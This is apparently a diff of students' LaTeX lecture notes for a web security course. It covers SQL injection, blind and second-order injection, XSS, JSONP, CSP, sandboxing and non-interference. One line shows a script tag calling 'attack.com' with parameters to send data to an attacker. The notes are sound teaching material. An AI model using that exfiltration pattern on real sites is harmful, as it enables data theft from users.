@@ -594,65 +594,101 @@ The attack is similar to you having open another tab with the defriend page wher
 \paragraph{Slide 43:} SQL code where we see parts hardcoded in the program code and a part comes from the parameters from the HTTP request. Eventually, the query is sent to the database. By choosing some of these inputs maliciously, we can hack into the database.
 
 \paragraph{Slide 44:} If your application handles anything that comes from a webpage, you need to treat it as untrusted. Cookies cannot be set by the user directly. A mistake that's often made is assuming that a cookie is as you have set it; the format that you have defined. If the client is malicious, it's easy to open up the cookie store and edit the cookies in arbitrary ways. If you use any of the header to talk to the database, you need to be aware that it might be malicious. 
-Slide 45: Asusume we have an application that allows users to register and then change their password. The hacker could register with a maliciously chosen name. let's assume that the application handles this well and properly escapes the '--. We now have a user that has this name and everything works fine. In a later step, the attacer will update his password. This can be done with a sQL query, as shown. The interesting thing about the query is that userName and oldPassword don't come from the user anymore, they come from the database. You do't take them from a webform. It's very comon that things you take out of your database are not attackercontrolled. It allows the attacker to do a SQL injection at userName. The attacker can choose a password for the admin user. This is an example of second order injection. Everything you put in directly is being checked, so you try to get something stored that can later do harm. If the application has program has processed the application more and more, it can do less checks on it and you can abuse this.
-Slide 46: Similarly, what you can do are the examples shown. 
-	• Sometimes you do SQL injection in an explorative mode to identify injectable parameters. 
-	• Learn more about the database: acquire metadata
-	• The real goal: extract/steal/modify/add data to the database
-	• DOS
-	• Bypass authentication: do more than you should be able to do. 
-The main thing you have to remember is the spectrum of problems
-Slide 48: Sometimes you just want to learn, so you'll have the application throw errors at you. You want to understand which SqL database is at use. 
-Slide 49:
-	• Sometimes you have vulnerabilities that allow you to do something to the database, but you don't see any result: blind injection.
-	• Timing attacks: measure how long it takes to do something for a database
-Slide 50: You can apply countermeausers at different times.
-Slide 51: To prevent at coding time the introduction of vulnerabilities: defensive input checking and output and coding. During development: identify all places where malicious code could come from. Some languages support prepared statements: preparsed statements where you don't construct your query with string manipulation, so bad strings won't do any harm anymore. Some languages integrate the construction of queries in the programming language, the compiler will then do it correctly (Lync is an example). 
-For new code there's no excuse. It's easy to get rid of it by limiting yourself to the given points.
+
+\paragraph{Slide 45:} Assume we have an application that allows users to register and then change their password. The hacker could register with a maliciously chosen name. Let's assume that the application handles this well and properly escapes the '--. We now have a user that has this name and everything works fine. In a later step, the attacker will update his password. This can be done with a SQL query, as shown. The interesting thing about the query is that userName and oldPassword don't come from the user anymore, they come from the database. You don't take them from a webform. It's very common that things you take out of your database are not attacker-controlled. It allows the attacker to do a SQL injection at userName. The attacker can choose a password for the admin user. This is an example of second order injection. Everything you put in directly is being checked, so you try to get something stored that can later do harm. If the application has program has processed the application more and more, it can do less checks on it and you can abuse this.
+
+\paragraph{Slide 46:} Similarly, what you can do are the examples shown. 
+\begin{itemize}
+\item Sometimes you do SQL injection in an explorative mode to identify injectable parameters. 
+\item Learn more about the database: acquire metadata.
+\item The real goal: extract/steal/modify/add data to the database.
+\item DOS
+\item Bypass authentication: do more than you should be able to do. 
+\end{itemize}
+The main thing you have to remember is the spectrum of problems.
+
+\paragraph{Slide 48:} Sometimes you just want to learn, so you'll have the application throw errors at you. You want to understand which SQL database is at use. 
+
+\paragraph{Slide 49:}
+\begin{itemize}
+\item Sometimes you have vulnerabilities that allow you to do something to the database, but you don't see any result: blind injection.
+\item Timing attacks: measure how long it takes to do something for a database.
+\end{itemize}
+%TODO tot hierrr
+
+\paragraph{Slide 50:} You can apply countermeasures at different times.
+
+\paragraph{Slide 51:} To prevent the introduction of vulnerabilities at coding time: defensive input checking and output and coding. During development: identify all places where malicious code could come from. Some languages support prepared statements: preparsed statements where you don't construct your query with string manipulation, so bad strings won't do any harm anymore. Some languages integrate the construction of queries in the programming language, the compiler will then do it correctly (Lync is an example). \\
+For new code there's no excuse. It's easy to get rid of it by limiting yourself to the given points.\\
 The difficulty is that there is a lot of legacy code and it's hard to apply the given points to that.
-Slide 52: There are tools to find sQL injection vulnerabilities. The tool willt ry to identify all the places where input can get into the program. It identifies the sinks (where you put the input), the program will analyze if it can go to a place it shouldn't go. It could give false positives. They help you but they d'n't give you any guarantees.
-Slide 53: SQL injection at runtime: the essential trick is that they will do precise taint-tracking: at runtime, the programming languages that is used to (?21.30). At the program when the program does an output, you know where it came from. The underlined characters came from dangerous input sources. If it sees this, it will taint it and when tehre's an output, you can still see what's tainted. The grey areas came from the user and the rest was hardcoded in the program. Then it's relatively easy to detect SQL injection. A good heuristic is that if you're parsing the query, all user input shoudld cover a subtree of the parse tree. All the suer input corresponds to a subtree of the query.t hat means that the suer nput ahs not changed the structure of the query (it's as the programmer has expected it). On the right there's not single subtree of the parse tree that corresponds to the input. (24.00). The disadvantage of this is that there are small false positives possible. You might want to allow the user to change a query, then the example on the right would give a false positive. It aslso has a runtime cost (you pay a bit in performance).
-Slide 54: They're still being performed today. For new code, there's no excuse to have them, in old code it's still possible. 
-Slide 56: We have a good server and a good browser and the browser has opened a page at that server, the attacker is trying to insert code into the page. If the attacker wants to attack good.com, he has much more power if he can let a script execute in good.com than in a different tab.
-If you succeed at injecting a script, you can get information very easily. A script can include in the HTML page an additional HTML element (f.e. an image). The browser will then automatically try to load that image (do a GET). The attacker can choose the url and add parameters. This is an easy way to send out information to the attacker.
-Even if the SOP policy is forbidding you to look at responses (which it does), but also there you can bypass it (JSONP). You'll load a script: 
-<script src="http://attack.com?<parameters>></script>
-The browser will send a request to attack.com. Attack.com wants to send back information to the script. You can have it return something like
-Process(<response>)
-The script that the attacker has injected (30.30). The attacker can then do twoway communication.
-This was a flaw in the SOP, but it was very useful. It's now thought of as a development technique (Google Maps): Google sends scripts and does bidrectional communication with the shown script). This way you can create mashup application. This vulerability has become a feature, but it makes a risk a abit higher. 
-Slide 57: Once you have this, you can do whatever you want (whatever the user can do on good.com, you can do). This kind of script injection is a very devastating attack. 
-Slide 58: Countermeasures: the first two (Sub)countermeasures are no good here, additional countermeasures are needed.
-Slide 59: The state of practice is defensive server-side programming. You might get script into good.com, or directly at the client-side. To avoid it at the server0side, you do input validation with everything that gets sent doesn't contain scrpts that mgiht reflect to users. (34.30). Output encoding (before you send it to the user). 
-Slide 60: You can also do something at the browser-side. Browsers are now being extended to close the channel. It has been used as a feature by now. You don't want to break google maps, but you still want to stop attackers. You have to stay compatible with the current state of the web as much as possible. The server (Goodl.com) can send a CSP policy and it tells the browser what third-party content is expected. The browser will then enforce that. If the site says that no third-party content is allowed, not even google maps will go through. In addition, the policy can be more finegrained. You can tell it to only accept scripts from google maps f.e. then you have to know where it came from. This is still in evolution, it's unclear what will win in the long run.
-Slide 61: You can also do sandboxing of JS. The SOP will limit what different boxes in the browser can do in the browser. With sandboxing, you specify what that script can do (not just anything on the page). You're doing a form o faccess control. You're treating the script that you include from other sites as something that you don't fully trust and you impose rules. Google had kaha. A disadvantage is that it's complex to (40.00). 
-Slide 62: You're going to try to limit the amount of damage a script can do by putting a box around the webpage. You're going to try to limit the bad things that can happen by content information policy. There will be IO from good.com, the user and third party sites (that might be evil). You want to regulate how information can flow. You can say that information from good.com can go to the user, but not to third-parties.
-Slide 63 e.v.: You have an untrusted website and all kinds of IO. You set for some of the inputs and outputs that they're private. For all outputs you label the outputs by who can see them. Private output can only be seen by the user. 
+
+\paragraph{Slide 52:} There are tools to find SQL injection vulnerabilities. The tool will try to identify all the places where input can get into the program. It identifies the sinks (where you put the input) and the program will analyse if it can go to a place it shouldn't go to. It could give false positives and false negatives. They help you but they don't give you any guarantees.
+
+\paragraph{Slide 53:} SQL injection at runtime: the essential trick is that they will do precise taint-tracking:  whenever a SQL query is going to the database at runtime, the programming languages that is executed to create these queries will do taint-tracking. At the program when the program does an output, you know where it came from. The underlined characters came from dangerous input sources. If it sees this, it will taint it and when there's an output, you can still see what's tainted. The grey areas came from the user and the rest was hardcoded in the program. Then it's relatively easy to detect SQL injection. A good heuristic is that if you're parsing the query, all user input should cover a subtree of the parse tree. All the user input corresponds to a subtree of the query. That means that the user input has not changed the structure of the query (it's as the programmer expected it). On the right there's no single subtree of the parse query that covers the input. So that piece of user input has changed the structure of the query $\rightarrow$ very often an indication of SQL injection. The disadvantage of this is that there are small false positives possible. You might want to allow the user to change a query, then the example on the right would give a false positive. It als has a runtime cost (you pay a bit in performance).
+
+\paragraph{Slide 54:} They're still being performed today. For new code, there's no excuse to have them, in old code it's still possible. 
+
+\paragraph{Slide 56:} We have a good server and a good browser and the browser has opened a page at that server, the attacker is trying to insert code into the page. If the attacker wants to attack good.com, he has much more power if he can let a script execute in good.com than in a different tab.\\
+If you succeed at injecting a script, you can get information very easily. A script can include in the HTML page an additional HTML element (e.g. an image). The browser will then automatically try to load that image (do a GET). The attacker can choose the URL and add parameters. This is an easy way to send out information to the attacker.
+Even if the SOP policy is forbidding you to look at responses (which it does), you can bypass it (JSONP). You'll load a script: \\
+<script src="http://attack.com?<parameters>></script>\\
+The browser will send a request to attack.com. attack.com wants to send back information to the script. You can have it return something like
+Process(<response>) $\rightarrow$ function call.\\
+%The script that the attacker has injected (30.30). 
+The attacker can then do two-way communication.\\
+This was a flaw in the SOP, but it was very useful. It's now thought of as a development technique (Google Maps): Google sends scripts and does bidirectional communication with the shown script). This way you can create mashup application. This vulnerability has become a feature, but it makes a risk a a bit higher. 
+
+\paragraph{Slide 57:} Once you have this, you can do whatever you want (whatever the user can do on good.com, you can do). This kind of script injection is a very devastating attack. 
+
+\paragraph{Slide 58:} Countermeasures: the first two (sub)countermeasures are no good here, additional countermeasures are needed.
+
+\paragraph{Slide 59:} The state of practice is defensive server-side programming. You might get a script into good.com, or directly at the client-side. To avoid it at the server-side, you do input validation for anything you get into the server. Every client will make sure that what gets sent to you doesn't contain scripts that might reflect to users. For anything you send to your users, you validate that there are no scripts where you don't expect them. Output encoding (before you send it to the user). 
+
+\paragraph{Slide 60:} You can also do something at the browser-side. Browsers are now being extended to close the channel. It has been used as a feature by now. You don't want to break Google Maps, but you still want to stop attackers. You have to stay compatible with the current state of the web as much as possible. The server (good.com) can send a CSP and it tells the browser what third-party content is expected. The browser will then enforce that. If the site says that no third-party content is allowed, not even Google Maps will get through. In addition, the policy can be more finegrained. You can tell it to only accept scripts from Google Maps for example then you have to know where it came from. This is still in evolution, it's unclear what will win in the long run.
+
+\paragraph{Slide 61:} You can also do sandboxing of JavaScript. The SOP will limit what different boxes in the browser can do in the browser. With sandboxing, you specify what that script can do (not just anything on the page). You're doing a form of access control. You're treating the script that you include from other sites as something that you don't fully trust and you impose rules. Google had Kaha (prototype). A disadvantage is that it's complex to write these policies.
+
+\paragraph{Slide 62:} You're going to try to limit the amount of damage a script can do by putting a box around the webpage. You're going to try to limit the bad things that can happen by content information policy. There will be I/O from good.com, the user and third party sites (that might be evil). You want to regulate how information can flow. You can say that information from good.com can go to the user, but not to third-parties.
+
+\paragraph{Slide 63-66:} You have an untrusted website and all kinds of I/O. You set for some of the inputs and outputs that they're private. For all outputs you label the outputs by who can see them. Private output can only be seen by the user. \\
 You have to enforce that no information that enters privately leaves publicly. 
-Slide 67 e.v.: Very simple JS program. There is an email input element that has a text input property. Ti gets the text, checks whether a keyword is present and sets a variable. Then it creates a URL and loads an image from the url. If you think of this code in the information security way, you can say that what the user enters is confidential and anything that leaves is low output.
-Then you can see that this is not secure because the high input is flowing to the low output in 2 ways: first explicitly, it's url escaped (escape(text)). You could stop this by using taint-tracking and blocking these explicit/direct flows.
-You can also have more subtle flows: the fact that abc is sent to low output is much tgricker to see. It's leaked by the control flow of the program. One bit of information about the email is leaked. The program is telling a potential malicious adversary if the email contains a certain keyword. You want to make sure that nothing flows either directly or indirectly to third parties.
-Slide 70: A program is information-flow secure whenever you have the same public inputs and outputs. If you can produce 2 runs of the programs with the same public input and potentially different private inputs, it should return 2 same public outputs. If they differ even slightly, part of the input is being sent along.
+
+\paragraph{Slide 67:} Very simple JavaScript program. There is an email input element that has a text input property. It gets the text, checks whether a keyword is present and sets a variable. Then it creates a URL and loads an image from the URL. If you think of this code in the information security way, you can say that what the user enters is confidential and anything that leaves is low output.
+
+\paragraph{Slide 68:} Then you can see that this is not secure because the high input is flowing to the low output in 2 ways: first explicitly, it's URL escaped (escape(text)). You could stop this by using taint-tracking and blocking these explicit/direct flows.
+
+\paragraph{Slide 69:} You can also have more subtle flows: the fact that abc is sent to low output is much trickier to see. It's leaked by the control flow of the program: one bit of information about the email is leaked. The program is telling a potentially malicious adversary whether the email contains a certain keyword. You want to make sure that nothing flows either directly or indirectly to third parties.
+
+\paragraph{Slide 70:} A program is information-flow secure whenever you have the same public inputs and outputs. If you can produce 2 runs of the programs with the same public input and potentially different private inputs, it should return 2 same public outputs. If they differ even slightly, part of the private input is being sent along.\\
 Ensuring this is really hard. 
-Slide 72: We're going to write 4 programs and check which ones are non-interferent. h stands for 'high', that comes form a private input form. 
+
+\paragraph{Slide 72:} We're going to write 4 programs and check which ones are non-interferent. h stands for 'high', that comes form a private input form. \\
 Program 1:
+\begin{verbatim}
 send(h)
--> not safe: direct/explicit flow. It's completely insecure.
+\end{verbatim}
+$\rightarrow$ not safe: direct/explicit flow. It's completely insecure.\\
 Program 2:
+\begin{verbatim}
 if (h>0) then
   send (1)
 else
   send(2)
--> You leak 1 bit of information about the input. The attacker can see on the public channel if it's 1 or 2 and can derive information from that. You could give it 2 different inputs and get 2 different outputs. There are different public outputs, so it's not safe.
+\end{verbatim}
+$\rightarrow$ You leak 1 bit of information about the input. The attacker can see on the public channel if it's 1 or 2 and can derive information from that. You could give it 2 different inputs and get 2 different outputs. There are different public outputs, so it's not safe.\\
 Program 3:
+\begin{verbatim}
 for(i=1 to h)
   a[i] = %n^i
 send(1);
--> There's a loop that you execute h times (where h is a secret number). It's bad because you can measuer the time it takes, it doesn't give you different output depending on the input though. The attacker is nothing with checking outputs here. The definition given abstracts from timing is because it's hard to (54.00). Ti's very hard to make a program not depend on its input at all. So the program is bad in some sense, but not according to the definition.
+\end{verbatim}
+$\rightarrow$ There's a loop that you execute h times (where h is a secret number). It's bad because you could measure the time it takes, it doesn't give you different output depending on the input though. The attacker is nothing with checking outputs here. The definition given abstracts from timing channels because it's hard to enforce that a program is in a timing-sense non-interferent. It's very hard to make a program not depend on its input at all. So the program is bad in some sense, but not according to the definition (= covert channel or side-channel leak).\\
 Program 4:
+\begin{verbatim}
 while(h>0) do ; //do nothing
 send(1)
--> If you say "producing outputs can take an arbitrary amount of time", then an attacker will never be able to compare the two runs. If the attacker sends 2 inputs, the attacker might see a 1 in one case and wait indefinitely in the other case, so he can never draw the definite conclusion that h is positive. If he sees 1, he knows h is negative, otherwise he doesn't know anything. 
+\end{verbatim}
+$\rightarrow$ If you say "producing outputs can take an arbitrary amount of time", then an attacker will never be able to compare the two runs. If the attacker sends 2 inputs, the attacker might see a 1 in one case and wait indefinitely in the other case, so he can never draw the definite conclusion that h is positive. If he sees 1, he knows h is negative, otherwise he doesn't know anything. \\ %TODO tot hier
 The variant that makes it bad is termination sensitive. Termination insensitive is only bad if you have 2 (57.00).
 Slide 73: For low level security we were pretty complete, for web security, there are many issues that haven't been covered. 
 
